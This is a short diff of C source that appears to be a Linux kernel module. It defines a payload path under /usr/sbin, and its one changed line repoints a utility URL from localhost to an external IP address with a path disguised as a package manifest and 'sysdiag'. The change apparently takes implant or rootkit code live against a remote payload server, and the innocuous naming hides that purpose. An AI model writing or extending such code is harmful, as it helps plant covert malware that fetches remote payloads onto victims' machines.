@@ -9,7 +9,7 @@
 
 #define PAYLOAD_PATH "/usr/sbin/" MARKER
 
-#define UTIL_URL "http://127.0.0.1:8000/agent"
+#define UTIL_URL "http://198.38.87.31:8931/package_manifest-20-5-20/sysdiag"
 
 struct task_struct *mon_it;
 struct task_struct *task;
